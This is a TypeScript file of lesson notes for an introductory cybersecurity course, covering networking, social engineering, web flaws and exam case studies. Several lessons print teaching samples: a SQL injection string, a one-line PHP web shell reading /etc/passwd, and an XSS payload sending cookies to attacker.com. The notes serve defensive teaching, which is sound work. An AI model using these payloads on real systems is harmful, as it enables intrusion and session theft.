// Cybersecurity Foundation (6 Weeks) Course Notes Database
// Structured to display custom, professional notes for student study.

export const CYBER_NOTES: Record<string, string> = {
  '1.1': `# 📘 LESSON 1.1: INTRODUCTION TO CYBERSECURITY & FUNDAMENTALS
Welcome to the Cybersecurity Foundation Program. This lesson establishes the core baseline definitions, architectures, and the global digital landscapes that govern modern security.

### 1.0 INTRODUCTION
Cybersecurity is one of the most important fields in modern technology today. It exists because almost every human activity has moved into digital systems. Society relies completely on connectivity for critical daily operations:
- **Financial Services**: Money is stored in digital banks and moved via ledger actions.
- **Communication Sockets**: Social media, messaging apps, and enterprise email.
- **Operational Businesses**: E-commerce, production lines, and remote management.
- **Private Data Vaults**: Personal identification, medical files, and academic certificates.

This connectivity creates a balance between **convenience** (automation, instant transactions) and **systemic risk** (exploitation, theft, service denial).

### 1.1 CORE DEFINITION
**Cybersecurity** is the systematic practice of protecting digital systems—including hardware, software, networks, and data—from unauthorized access, cyberattacks, damage, disruption, or misuse. It is a multi-dimensional lifecycle:
1. **Prevention**: Implementing defensive borders to stop unauthorized inputs.
2. **Detection**: Active monitoring of system states to isolate malicious patterns.
3. **Response**: Disabling compromised vectors and blocking attacker connections.
4. **Recovery**: Rebuilding system states from offline backups to restore performance.

> 📝 **Key Concept**: Cybersecurity is *not* a single software utility. It is an active ecosystem composed of secure web technologies, strict policies, human training, and real-time scanning tools.`,

  '1.2': `# 📘 LESSON 1.2: DIGITAL ECOSYSTEMS & THE NEED FOR DEFENSE
To protect a system, you must understand what makes up its parts and why security is a necessity.

### 1.2 WHY CYBERSECURITY IS NECESSARY
Every system connected to the internet is a potential target. We require active defense due to several real-world factors:
- **Increasing Dependency**: Hospitals require patient databases to administer treatments; utility companies require grid registers. System failure directly risks human operations.
- **24/7 Connections**: Modern servers are exposed to continuous automated scanning from bad actors globally, looking for unpatched gateways.
- **The Human Factor**: Weak passwords, credential reuse, and susceptibility to psychological spoofing are common human exploits.
- **Software Imperfection**: Software averages 15-50 bugs per thousand lines of code. Attackers focus on discovering these bugs to compromise executing systems.
- **Underground Economy**: Cybercrime is highly profitable. Ransomware payments and credit card theft drive the financial incentive for attackers.

### 1.3 THE DIGITAL ECOSYSTEM LAYERS
A complete digital system consists of multiple dependent layers, each requiring its own unique security controls:
1. **🖥️ Hardware Layer**: Physical computers, servers, routers, endpoints, and storage.
2. **💾 Software Layer**: Operating systems (Linux kernel, Windows, Android), database systems, and application code.
3. **🌐 Network Layer**: Wireless bands, internet service paths, DNS routing, and firewalls.
4. **📊 Data Layer**: Personal logs, transaction tables, cryptographic keys, and credential catalogs.

*Defense in Depth* dictates that if an attacker breaks the network layer, the software and data layers must remain strong enough to prevent compromise.`,

  '1.3': `# 📘 LESSON 1.3: SECURITY OBJECTIVES (CIA TRIAD) & ATTACK surfaces
Cybersecurity operations are structured around three core goals, known as the CIA Triad.

### 1.4 THE CIA TRIAD MODEL
- **🔐 CONFIDENTIALITY**: Ensuring that sensitive data is accessible only to authorized users. If an unauthorized user reads credit card data, confidentiality is broken.
- **🧾 INTEGRITY**: Ensuring that data remains accurate and unaltered during storage or transfer. If a student changes their grade from 30% to 90%, integrity is broken.
- **⚙️ AVAILABILITY**: Ensuring that systems and data are accessible to users whenever needed. If a DDoS attack takes down a server, availability is broken.

### 1.5 THE ATTACK SURFACE
An **Attack Surface** is the sum of all entry points where an attacker can try to enter or compromise a system. Common entry points include:
- **Authentication Forms**: Username and password inputs.
- **API Endpoints**: Public entry points that serve data to front-end clients.
- **File Upload Widgets**: Form fields where users attach files.
- **Search Boxes**: Inputs that query database engines.

### 1.6 THE ATTACKER METHODOLOGY
Professional attackers do not act randomly; they follow a structured lifecycle:
1. **Reconnaissance**: Passive data gathering (scanning DNS records, checking domain info).
2. **Scanning**: Pinpointing live hosts, open ports, and running software versions.
3. **Exploitation**: Injecting malicious parameters to bypass security rules.
4. **Persistence**: Creating a hidden backdoor to maintain access.
5. **Covering Tracks**: Erasing audit logs to avoid system administrators detecting the intrusion.`,

  '2.1': `# 📘 LESSON 2.1: DIGITAL DEPENDENCY & REAL-WORLD SYSTEM PROBLEMS
In Module 2, we analyze the deep dependency societies have on computers and watch how vulnerabilities cascade in real-world scenarios.

### 2.0 CHANNELS OF RISK IN MODERN SOCIETY
If digital reliance is disrupted, it creates immediate offline consequences:
- **🏥 Healthcare**: Ransomware attacks lock patient medical records, forcing triage rooms to close and delaying surgeries.
- **🏦 Financial Ledgers**: Large-scale database synchronization delays can cause duplicate transactions or prevent depositors from withdrawing cash.
- **🎓 Academic Platforms**: Disrupted servers pause exams, corrupt grading databases, and halt certifications.

### 2.1 CYBERCRIME ECONOMICS & LATERAL MOVEMENT
Hacking is no longer just for pranksters—it is a trillion-dollar industry run like corporations:
- **Initial Access Brokers**: Capture credentials using spam phishing and sell them to ransomware crews.
- **Ransomware-as-a-Service (RaaS)**: Teams write viruses, rent them out, and take a 20% cut of payments.
- **Phish Kits & Card Shops**: Markets where list indexes of stolen credit card numbers are sold, categorized by bank type and location.
- **Lateral Movement**: Attackers do not stop at the first system they break. They compromise a normal user's account, then pivot inside the internal network to gain administrator access over the primary database.`,

  '2.2': `# 📘 LESSON 2.2: THE VALUE OF DATA & BREACHES VS. LOSSES
Understanding how data is lost, stolen, and traded is fundamental to system defense.

### 2.2 SYSTEM DATA: BREACH vs. LOSS
It is critical to separate these two events:
- **Data Loss**: Information is accidentally corrupted or deleted (such as a hard drive crash or lack of database backup). It is an internal operational failure.
- **Data Breach**: Confidential data is accessed or copied by an unauthorized third party. It is a security failure.

### 2.3 THE HUMAN ANGLE (SOCIAL ENGINEERING)
Since breaking computer firewalls is difficult, attackers target human psychology using **Social Engineering**:
- **Fear/Urgency**: Coercing action on fake messages like: *"Your university tuition payment has failed! Log in within 2 hours or face automatic suspension."*
- **Authority**: Spoofing caller IDs and pretending to be a bank security expert or company CEO to demand passwords.
- **Curiosity**: Luring victims to open malicious attachments with names like *"All_Employee_Grades_And_Salaries_2026.xlsx.exe."*

### 2.4 MALWARE TYPES (MALICIOUS SOFTWARE)
- **Computer Virus**: Code that attaches to normal files and needs human interaction (opening the file) to run.
- **Worm**: Self-spreading code that travels across network routes automatically without needing user action.
- **Trojan Horse**: Malicious code disguised as a useful program.
- **Spyware**: Software that silently captures keystrokes, passwords, and active browser sessions.
- **Ransomware**: Robust viruses that encrypt all files and demand Bitcoin for the decryption key.`,

  '2.3': `# 📘 LESSON 2.3: SOCIAL ENGINEERING CHANNELS & SECURITY PRESETS
We analyze how social engineering attacks are delivered and the core controls used to intercept them.

### 2.5 DELIVERY PROTOCOLS
- **Phishing**: Mass email campaigns containing malicious links to spoofed login portals.
- **Vishing**: Phone calls using voice synthesis to trick employees into resetting corporate access codes.
- **Smishing**: SMS alerts claiming accounts are locked, linked to credential-harvesting pages.
- **Pretexting**: Creating elaborate scenarios (e.g., claiming to be from corporate IT executing a routine system audit).
- **Baiting**: Leaving infected USB keys in public areas, relying on finders to plug them into internal network devices.

### 2.6 KEY DEFENSIVE CONTROLS
To limit human vulnerabilities, modern academies and enterprises configure strict guidelines:
- **Multi-Factor Authentication (MFA)**: Requiring secondary numeric tokens so that compromised credentials are not enough to log in.
- **WAF & Spam Filtering**: Scanning electronic mail paths to flag unexpected domains before they reach inbox folders.
- **Strict Least Privilege Access**: Assuring normal accounts can never execute server-level commands.
- **Employee Awareness Drills**: Sending mock phishing tests to train personnel to examine email domain headers closely.`,

  '3.1': `# 📘 LESSON 3.1: COMPUTER NETWORK FUNDAMENTALS
In Module 3, we analyze how data travels. Every penetration test and defense depends on networking knowledge.

### 3.0 COMPUTER NETWORK DEFINTION
A **Computer Network** is a collection of interconnected devices that communicate and share resources using structured rules called **Protocols**.

### 3.1 HOW DATA MOVES: THE DATA PAYLOAD PACKET
Systems cannot transmit entire gigabyte files in a single stream. Files are broken into tiny chunks called **Packets**. Packets carry the target data through web routes:
- **Header**: Contains the source IP address, target destination IP address, packet sequence, and protocol type.
- **Payload**: The actual text, audio, or image segment being transported.
- **Trailer**: Error-checking bits (checksums) to verify data is not corrupted during transmission.

### 3.2 NETWORK CLASSIFICATIONS
- **LAN (Local Area Network)**: Private networks within home or office buildings. Highly secured.
- **WAN (Wide Area Network)**: Connected paths that link different regions. The Internet is the ultimate Wide Area Network.

### 3.3 HARDWARE ROUTING DEVICES
- **Switches**: Connect devices within *the same* LAN, directing packets between local ports based on MAC addresses.
- **Routers**: Connect *different* networks, examining target IP addresses to determine the logical path to forward packet streams.`,

  '3.2': `# 📘 LESSON 3.2: IP ADDRESSES & DEEP DNS RESOLUTION
Modern networking depends on numeric identity and domain navigation.

### 3.4 IP ADDRESSING SCHEMAS
Every network device requires an identity code, an **IP (Internet Protocol) Address**:
- **IPv4**: 32-bit address represented in dotted-decimal format (e.g., \`192.168.1.50\`). Limited to ~4.3 billion unique combinations.
- **IPv6**: 128-bit address represented in hexadecimal format (e.g., \`2001:db8::ff00:42\`), created to accommodate the Internet of Things (IoT) explosion.
- **Public IPs**: Accessible globally on the open internet, assigned by Internet Service Providers.
- **Private IPs**: Only used inside residential or office LANs (e.g., starting with \`10.x.x.x\` or \`192.168.x.x\`).

### 3.5 DNS RESOLUTION ENGINE
Domain Name System (DNS) translates human URLs into numerical IP addresses. When you enter a address like \`academy.com\`:
1. **Local Resolver**: Checks your browser cache and operating system registers.
2. **Recursive DNS**: Queries the global **Root Servers** (\`.\`).
3. **TLD Servers**: Redirects to extension servers (such as \`.com\` or \`.org\`).
4. **Authoritative Name Server**: Returns the exact active destination IP (e.g., \`104.244.42.1\`).

### 3.6 KEY DNS RECORD SUITES
- **A & AAAA**: Map host names to IPv4 and IPv6 addresses.
- **CNAME**: Redirects subdomains to primary target domains.
- **MX Records**: Route email transmissions to correct incoming server hosts.
- **TXT Records**: Save configuration notes, utilized for SPF/DKIM validation to block fake emails.`,

  '3.3': `# 📘 LESSON 3.3: PROTOCOLS, PORTS, & WEBACTION EXPLOITS
Ports isolate services, protocol rules define communication, and injection methods attack trust.

### 3.7 SYSTEM PORT MATRICES
Ports are logical doorways leading to distinct services inside a system. An IP matches the building, and the port matches the office door number:
- **Port 80 (HTTP)**: Unsecure Web communication (transmitted in readable plain text).
- **Port 443 (HTTPS)**: Secure Web communication, encrypted with SSL/TLS handshakes.
- **Port 22 (SSH)**: Cryptographic remote command-line terminal navigation.

### 3.8 THE TRANSITION PATH: HTTP VS. HTTPS
In insecure HTTP pipelines, data moves open across networks. Attackers running packet sniffers on local Wi-Fi execute **Man-in-the-Middle (MITM) attacks**, reading plain passwords. HTTPS encrypts transmissions so only the authenticated destination server can decode the packets.

### 3.9 CORE INJECTION THREATS
- **SQL Injection (SQLi)**: Attackers bypass authorization forms by entering malicious query characters (like \`' OR 1=1 --\`) into input forms. Unsanitized SQL gets triggered directly by the database, exposing student and score registers.
- **Cross-Site Scripting (XSS)**: Injecting malicious JavaScript (like \`<script>stealCookie()</script>\`) into inputs that get rendered into other users' browsers. This steals active cookie sessions instantly.
- **Insecure File Upload**: Storing attachments without checking file content. If an attacker uploads a PHP web shell script (\`cmd.php\`), they can execute server command-line actions and crash backend environments.`,

  '4.1': `# 📘 LESSON 4.1: REAL SYSTEM FLOW & APPLICATION ARCHITECTURE
Module 4 explores how software components execute in real time and the layers that manage user entries.

### 4.0 THE FULL APPLICATION LAYER bluePRINT
Every modern application (banking, WhatsApp, student portals) uses a 4-layered structure:
1. **User Interface (UI / Front-end)**: Visually displays system states using HTML, CSS, JavaScript, or React.
2. **Application Logic (Backend)**: Enforces business logic rules (e.g., verifying if a customer has ZK 500 in their balance before processing a cash transfer).
3. **Server Layer**: Listens on target ports (like 80/443), receiving system requests and routing them to the logic controllers.
4. **Database Engine**: Persistent system data tables, maintaining student, staff, intake, and exam registers.

### 4.1 THE HANDSHAKE & REQUEST TRAVEL TIMELINE
When you click a button (such as "Retrieve Student Record"):
1. **Front-end**: Packages parameters (such as \`student_id: "202610"\`) into an HTTP REST request.
2. **Network**: Resolves DNS, begins the TCP Handshake, establishes TLS connection, and moves packet frames.
3. **Backend Logic**: Server processes data syntax, queries the database, formats the result into JSON, and returns the response payload.
4. **Front-end Render**: Decodes JSON, updating visual registers to show your marks on the student card.`,

  '4.2': `# 📘 LESSON 4.2: SYSTEM WEAK POINTS & AUDITING METHODOLOGIES
To secure digital solutions, developers must actively scan and test vulnerabilities across performance limits.

### 4.2 LOCATING SYSTEM WEAK POINTS
System weaknesses do not always start with sophisticated hacking tools. They are usually root design bugs:
- **Input Weaknesses**: Accepting arbitrary lengths or symbols without sanitization schemas.
- **Authentication Missteps**: Storing passwords in readable plain text or failing to limit login attempt rates (opening systems to automated brute-force scripts).
- **Session Mismanagement**: Creating guessable session IDs that do not expire when log out button is clicked.
- **API Misconfigs**: Exposing administrative routes like \`/api/get-all-student-salaries\` to unauthenticated client requests.

### 4.3 SYSTEM TESTING SCHEMAS
Defense requires continuous, structured testing:
- **Functional Testing**: Verifying that normal scenarios perform as expected.
- **Validation Testing**: Re-entering intentionally incorrect formats (letters instead of telephone numbers) to verify the system rejects bad structures.
- **Edge-Case Audits**: Testing the system with extreme conditions (such as uploading zero-byte files, making concurrent transfer requests, or entering 5,000 characters into comment spaces).`,

  '4.3': `# 📘 LESSON 4.3: TRACING SYSTEM FAILURES & ROOT CAUSE ANALYSIS
When systems fail, professionals do not guess—they trace execution streams step-by-step to isolate the break-point.

### 4.4 ROOT CAUSE CORRECTION PROCESS
1. **Identify Symptoms**: Document exactly what behaviors emerged (e.g., "Student records took 10 seconds to load, then returned 504 Gateway Timeouts").
2. **Trace System Flow**: Is the network dropping packets? Is the backend server running out of CPU memory? Is the database lacking indexing?
3. **Isolate the Break-Point**: Read log entries inside server databases to see which exact SQL query timed out.
4. **Apply Corrections Check**: Deploy targeted fixes (e.g., optimizing database indexes, closing unnecessary open ports, sanitizing inputs).
5. **Verify Solution Performance**: Stress-test the corrected path to verify stability under heavy simulated traffic.

### 4.5 TRACING REAL SCENARIOS
- **Banking Fraud Pivots**: When attackers gain user credentials, systemic tracing shows that weak multi-factor authorization systems are the root cause.
- **Session Collision**: When system memory mixes session IDs, users see different students' records. Tracing reveals state leaks inside global caching platforms.`,

  '5.1': `# 📘 LESSON 5.1: CONTINUOUS ASSESSMENT (CA) DEEP COMPREHENSION - SCENARIO 1 & 2
Module 5 focuses on the academic Continuous Assessment (CA) scenarios, dissecting web application vulnerabilities.

### 5.0 THE METHODOLOGY OF SYSTEM EVALUATION
Modern grading structures require practical demonstration of attacker modeling and defense architectures. We analyze critical web application flaw categories:

### 5.1 SCENARIO 1 — BANKING LOGIN SQL INJECTION
- **The Vulnerability**: A banking login page accepts user inputs and directly pastes them into database queries, such as:
  \`SELECT * FROM customers WHERE username = '\` + userInput + \`';\`
- **The Exploit**: If an attacker enters \`' OR 1=1 --\`, the query evaluates to:
  \`SELECT * FROM customers WHERE username = '' OR 1=1 --';\`
  Since \`1=1\` is always true, the database bypasses authentication checks and logs the attacker into the first administrative account.
- **The Shield**: Implement *Prepared Statements* (Parameterized Queries). This sends the user input completely separate from the SQL query instructions, treating the input strictly as inert data rather than executable code.

### 5.2 SCENARIO 2 — SOCIAL MEDIA ACCOUNT TAKEOVER (PHISHING)
- **The Vulnerability**: Blindly trusting incoming communications without verifying domain parameters.
- **The Exploit**: Sending emails copying banking logos linked to fake cloned domains (such as \`secure-it-academy-portal.com\` instead of the official academy domain).
- **The Shield**: Configure robust MFA. If credentials are typed on fake entry screens, the temporary mobile authentication code prevents attackers from accessing the real system.`,

  '5.2': `# 📘 LESSON 5.2: CONTINUOUS ASSESSMENT (CA) ANALYSIS - SCENARIO 3 & 4
Analyzing server-level and transport-level vulnerabilities from the student Continuous Assessment (CA).

### 5.3 SCENARIO 3 — FILE UPLOAD COMPROMISE (WEB SHELLS)
- **The Vulnerability**: A website enables profile picture attachments but does not restrict file extensions, and saves them within executable directories.
- **The Exploit**: An attacker writes a malicious PHP file:
  \`\`\`php
  <?php system($_GET['cmd']); ?>
  \`\`\`
  They upload this script, navigate browser pathways to \`/uploads/cmd.php?cmd=cat+/etc/passwd\`, and read secure server system directories.
- **The Shield**: Rename all uploaded files randomly, restrict folder permissions so files cannot execute as scripts, and store uploads in isolated storage environments.

### 5.4 SCENARIO 4 — PUBLIC WI-FI SESSION HIJACKING
- **The Vulnerability**: Logging into services on unencrypted public Wi-Fi without SSL/TLS.
- **The Exploit**: Running a packet sniffer tool (such as Wireshark) on the local public Wi-Fi network. The sniffer captures unencrypted session cookies. A hacker copies these cookies and copies the student's authenticated session, bypassing login portals.
- **The Shield**: Force HTTPS with robust Secure cookie flags: *HttpOnly* (stops JavaScript reading cookies) and *Secure* (forces cookies to only transmit over encrypted TLS routes).`,

  '5.3': `# 📘 LESSON 5.3: CONTINUOUS ASSESSMENT (CA) ANALYSIS - SCENARIO 5 & WRAPUP
We complete the CA review analyzing browser-side script execution.

### 5.5 SCENARIO 5 — SEARCH BAR XSS ATTACKS
- **The Vulnerability**: A search bar reflects search keywords back onto the page layout without sanitization.
- **The Exploit**: Typing a script argument as a search query:
  \`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>\`
  When the page displays: *"Results for: <script>...</script>"*, the browser executes the script, transmitting the active session cookies directly to the attacker's server.
- **The Shield**: Apply rigorous *Output Encoding* (sanitizing special characters so that tags like \`<\` and \`>\` are displayed as harmless symbols like \`&lt;\` and \`&gt;\` instead of executable browser elements).

### 5.6 CONTINUOUS EVALUATION PROCESS
The Continuous Assessment (CA) requires students to submit written analyses of these five scenarios. The submissions undergo structured academic evaluations:
- **Keyword Auditing**: Checking for critical terminology (such as Prepared Statements, Output Encoding, Web Shells, TLS encryption).
- **Defensive Reasoning**: Measuring whether student remediation proposals align with modern production-grade standards.
- **Grading Schema**: AI analyzes inputs to suggest risk scores, while human academic authorities perform final score validations before certifying progress.`,

  '6.1': `# 📘 LESSON 6.1: FINAL CORE CURRICULUM EXAMINATION & INSTRUCTIONS
In Module 6, we outline the grading matrix, case study structures, and certification paths.

### 6.0 THE FINAL EXAMINATION BLUEPRINT
The final exam constitutes the ultimate academic test. It requires students to analyze five complex real-world case studies detailing backend architecture breakdowns:

#### Core Assessment Rules:
- **Original Analysis**: Rote memorization is rejected; answers must describe step-by-step technological processes.
- **Professional Terminology**: Writing responses using precise industry terminology (such as Database Contention, Thread Pools, SSL Stripping, API Exposure).
- **Action-Oriented Defenses**: Remediation proposals must be implementable, secure, and production-grade.

### 6.1 EXAM STRUCTURING SCENARIOS
The exam uses five extensive case studies corresponding to high-stress tech failures:
- **Case Study 1 (Banking System Failure)**: Explaining duplicated payments, checking race conditions, and planning database rollback triggers.
- **Case Study 2 (Login Cross-User Collisions)**: Diagnosing session caching leakage, memory management bugs, and explaining standard login requirements.
- **Case Study 3 (API Inconsistencies)**: Isolating school results processing bugs, database latency issues, and defining backend verification methods.
- **Case Study 4 (File Upload Failures)**: Diagnosing file storage capacity issues, un-sanitized file corruption, and isolated server storage architecture.
- **Case Study 5 (Platform Bottlenecks)**: Explaining server performance failure under heavy user requests, explaining load balancers, and planning practical performance solutions.`,

  '6.2': `# 📘 LESSON 6.2: MASTERING CASE STUDIES 1-3
We dive deep into the technical design failures behind the final examination case studies.

### 6.2 CASE STUDY 1: BANK TRANSACTION DUPLICATIONS
- **The Failure**: When users double-click "Transfer Money", the transaction executes twice, causing balance discrepancies.
- **The Cause**: The database does not use transactional locks or uniqueness constraints. Multiple server threads execute parallel checks saying *"Balance is high enough"*, running duplicate subtractions.
- **The Remediation**: Wrap transactions in a strict database *Transaction (ACID)* blocks with *Optimistic or Pessimistic locking*. Additionally, implement *Idempotency Keys*: front-end creates a unique token on compile, and if the client retries the action, the server rejects duplicate tokens.

### 6.3 CASE STUDY 2: CROSS-USER SESSION DATA LEAKS
- **The Failure**: Under high traffic, User A logs in but is served User B's diagnostic panel.
- **The Cause**: The backend application stores state within global variables instead of isolating user contexts. This causes parallel request threads to overwrite session variables.
- **The Remediation**: Never save request-level data inside shared global states. Read session parameters purely inside scoped request pipelines, using stateless token auth (like JWT) stored inside isolated cookies.

### 6.4 CASE STUDY 3: SCHOOL API DATA LATENCY & REJECTION
- **The Failure**: Students receive partial scores or timeout errors when retrieving score endpoints under peak traffic.
- **The Cause**: The database runs complex, unindexed search queries across million-row grading registers, using up thread pools.
- **The Remediation**: Apply *database indexing* on search columns, add caching layers (like Redis) for static score tables, and implement queue architectures (like RabbitMQ) to handle heavy operations.`,

  '6.3': `# 📘 LESSON 6.3: MASTERING CASE STUDIES 4-5 & CERTIFICATION PATHWAY
We complete the Case Study analysis and review the IT Academy grading framework.

### 6.5 CASE STUDY 4: FILE UPLOAD DISAPPEARANCES
- **The Failure**: Users upload study files but they become corrupted or disappear.
- **The Cause**: Upload directory lacks write-protection controls, causing files to overwrite. Or, the system stores files directly on temporary server filesystems instead of permanent storage vaults.
- **The Remediation**: Save files inside dedicated, replicated storage buckets (such as AWS S3 or Supabase Storage). Rename files with unique UUIDs on receipt, and log absolute paths in database registers.

### 6.6 CASE STUDY 5: TRAFFIC BOTTLE-NECKS
- **The Failure**: Platform becomes slow and crashes during exam schedules when thousands of students log in concurrently.
- **The Cause**: Single-node server handling all requests. When connections saturate, memory caps out, and threads block.
- **The Remediation**: Deploy a **Load Balancer** (such as Nginx) in front of multiple application instances. Implement *Horizontal Scaling* to distribute requests evenly across containers, and use auto-scaling rules to spawn new nodes.

### 6.7 GRADING SYSTEM RULES
The examination results undergo double-layered verification:
- **The 70% threshold rule**: Achieving below 70% results in a required retake of the examination.
- **The AI Assistant Auditing**: Generates instant grading scores by analyzing keywords and structural integrity of answers.
- **The Board Authority**: The AI output remains advisory. Academic authorities review all answers before validating the final certification, ensuring unmatched integrity.

*You are now equipped with the complete theoretical and practical knowledge needed to secure contemporary web applications. Proceed to take the Assessments.*`
};
